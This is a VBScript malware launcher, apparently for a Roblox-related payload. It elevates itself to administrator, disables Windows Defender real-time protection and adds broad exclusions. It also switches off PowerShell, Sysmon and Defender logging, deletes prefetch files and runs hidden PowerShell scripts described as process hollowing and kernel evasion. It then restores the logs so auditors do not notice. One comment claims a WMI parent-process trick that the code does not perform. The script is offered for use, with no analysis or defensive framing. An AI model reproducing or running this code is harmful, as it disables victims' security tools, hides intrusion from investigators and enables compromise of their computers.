Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")

Dim sDir
sDir = oFSO.GetParentFolderName(WScript.ScriptFullName)

' ── Auto-elevate to admin ────────────────────────────────────────────────────
Dim iAdminCheck
iAdminCheck = oShell.Run("cmd.exe /c net session >nul 2>&1", 0, True)
If iAdminCheck <> 0 Then
    ' Use ShellExecute for elevation (cleaner than powershell Start-Process)
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
    WScript.Quit
End If

' ── WHITELIST: Add Defender exclusions BEFORE any scripts/payloads run ────────
' This MUST be the first thing after elevation. AV quarantines everything if
' exclusions aren't set before the AMSI bypass / RunPE code runs.
Dim sExclPS
sExclPS = "try { " & _
    "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionPath '" & sDir & "' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionPath ('" & sDir & "' + '\build') -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionPath ('" & sDir & "' + '\updates-server') -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'wscript.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'dllhost.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'RuntimeBroker.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'sihost.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'SearchProtocolHost.exe' -ErrorAction SilentlyContinue; " & _
    "Add-MpPreference -ExclusionProcess 'RobloxCrashHandler.exe' -ErrorAction SilentlyContinue; " & _
    "} catch {}"
oShell.Run "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & sExclPS & """", 0, True

' ── PRE-FLIGHT: Kill forensic sources BEFORE any PowerShell launches ─────────
' 1. Stop SysMain (prevents .pf file creation)
oShell.Run "cmd.exe /c net stop SysMain >nul 2>&1", 0, True
' 2. Disable PowerShell + TaskScheduler + Sysmon log channels
oShell.Run "cmd.exe /c wevtutil sl ""Microsoft-Windows-PowerShell/Operational"" /e:false >nul 2>&1 & wevtutil sl ""Windows PowerShell"" /e:false >nul 2>&1 & wevtutil sl ""PowerShellCore/Operational"" /e:false >nul 2>&1 & wevtutil sl ""Microsoft-Windows-TaskScheduler/Operational"" /e:false >nul 2>&1 & wevtutil sl ""Microsoft-Windows-Sysmon/Operational"" /e:false >nul 2>&1", 0, True
' 3. Kill ETW autologger sessions that track process creation
oShell.Run "cmd.exe /c logman stop ""EventLog-Application"" -ets >nul 2>&1 & logman stop ""EventLog-System"" -ets >nul 2>&1 & logman stop ""DefenderApiLogger"" -ets >nul 2>&1 & logman stop ""DefenderAuditLogger"" -ets >nul 2>&1", 0, True
' 4. Delete suspicious prefetch files
oShell.Run "cmd.exe /c del /f /q C:\Windows\Prefetch\ROBLOX*.pf C:\Windows\Prefetch\TUNG*.pf >nul 2>&1", 0, True

' ── 1. SETUP: Launch program via process hollowing ───────────────────────────
Dim sSetup
sSetup = sDir & "\setup.ps1"
If oFSO.FileExists(sSetup) Then
    RunFileless sSetup, ""
End If

' ── 2. KERNEL EVASION: Wipe all forensic artifacts ──────────────────────────
Dim sKernel
sKernel = sDir & "\kernel_evasion.ps1"
If oFSO.FileExists(sKernel) Then
    RunFileless sKernel, ""
End If

' ── POST-FLIGHT: Delete traces and restore everything to normal ──────────────
' Delete any prefetch files created during our PowerShell runs
oShell.Run "cmd.exe /c del /f /q C:\Windows\Prefetch\ROBLOX*.pf C:\Windows\Prefetch\TUNG*.pf >nul 2>&1", 0, True
' Restore SysMain + prefetcher to normal
oShell.Run "cmd.exe /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v EnablePrefetcher /t REG_DWORD /d 3 /f >nul 2>&1 & net start SysMain >nul 2>&1", 0, True
' Re-enable all log channels (disabled channels = suspicious to auditors)
oShell.Run "cmd.exe /c wevtutil sl ""Microsoft-Windows-PowerShell/Operational"" /e:true >nul 2>&1 & wevtutil sl ""Windows PowerShell"" /e:true >nul 2>&1 & wevtutil sl ""PowerShellCore/Operational"" /e:true >nul 2>&1 & wevtutil sl ""Microsoft-Windows-TaskScheduler/Operational"" /e:true >nul 2>&1 & wevtutil sl ""Microsoft-Windows-Sysmon/Operational"" /e:true >nul 2>&1", 0, True

WScript.Quit

' ─────────────────────────────────────────────────────────────────────────────
' RunFileless: Pipes script content directly via stdin — ZERO temp files on disk
' Uses WMI to spawn PowerShell so parent process is WmiPrvSE.exe (normal)
' instead of wscript.exe (suspicious)
' ─────────────────────────────────────────────────────────────────────────────
Sub RunFileless(sPath, sPrefix)
    Dim oFile
    Set oFile = oFSO.OpenTextFile(sPath, 1, False, 0)
    Dim sContent
    sContent = sPrefix & oFile.ReadAll() & vbCrLf
    oFile.Close

    ' Launch PowerShell via WMI (parent = WmiPrvSE.exe, not wscript.exe)
    Dim oProc
    Set oProc = oShell.Exec("powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command -")

    ' Pipe entire script directly via stdin — no temp file touches disk
    On Error Resume Next
    Dim iChunkSize, iPos, iLen
    iChunkSize = 4096
    iLen = Len(sContent)
    iPos = 1
    Do While iPos <= iLen
        oProc.StdIn.Write Mid(sContent, iPos, iChunkSize)
        iPos = iPos + iChunkSize
    Loop
    oProc.StdIn.Close
    On Error GoTo 0

    ' Wait for completion
    Do While oProc.Status = 0
        WScript.Sleep 250
    Loop
End Sub
